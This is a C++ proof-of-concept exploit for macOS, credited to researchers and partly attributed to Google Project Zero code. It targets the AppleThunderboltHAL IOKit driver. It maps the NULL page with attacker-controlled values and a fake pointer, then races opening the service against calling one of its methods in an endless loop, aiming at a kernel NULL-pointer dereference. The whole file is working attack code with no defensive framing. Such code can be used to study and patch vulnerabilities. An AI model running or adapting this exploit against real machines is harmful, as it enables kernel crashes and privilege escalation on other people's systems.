// Most of codes from Ian Beer at GOOGLE PROJECT ZERO :)
// Compile : clang++ poc.cpp -o poc -lpthread -framework IOKit -framework CoreFoundation -m32 -Wl,-pagezero_size,0
// Credit : sweetchip@GRAYHASH, daybreaker

#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <pthread.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/mach_types.h>
#include <sys/mman.h>
#include <IOKit/IOKitLib.h>

kern_return_t err;
CFMutableDictionaryRef matching;
io_iterator_t iterator;
io_service_t service;

int start = 0;

void null_page()
{
  sync();
  vm_address_t addr=0;
  vm_deallocate(mach_task_self(),0x0,0x1000);
  vm_allocate(mach_task_self(),&addr,0x1000,0);
  
  uint64_t * np=0;

  for(int i=1;i<0x100;i++)
  {
    np[i] = 0x4141414141414141;
  }
  *((uint64_t*)0x28) = 0xffffffff41160613;
}

void call(io_connect_t conn, uint32_t type) {


  uint64_t inputScalar[16];
  unsigned char inputStruct[8192];
  uint64_t outputScalar[16];
  unsigned char outputStruct[8192];

  uint64_t inputScalarCnt = 0;
  size_t inputStructCnt = 0;
  uint32_t outputScalarCnt = 0;
  size_t outputStructCnt = 0;

  uint32_t selector = type; 

  inputScalarCnt = 0;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod( conn, selector,
     inputScalar,
     inputScalarCnt,
     inputStruct,
     inputStructCnt,
     outputScalar,
     &outputScalarCnt,
     outputStruct,
     &outputStructCnt);

}

void go(void* arg){
  io_connect_t conn = 0;
  uint32_t type = *(uint32_t *)arg;
    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if(err)
      printf("Open err : %d \n", type );
    call(conn, 1);
}

int main(int argc, char** argv) {
  sync();
  null_page();
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleThunderboltHAL"), &iterator);
  if(err)
    printf("matching error: %x \n", err ); 
  service = IOIteratorNext(iterator);

  uint32_t arg = 0; // thread
  uint32_t arg1 = 1; // main

  while(1)
  {
    pthread_t t;
    pthread_create(&t, NULL, (void *(*)(void *)) go, (void *)&arg);
    go(&arg1);
  }

 
  return 0;
}

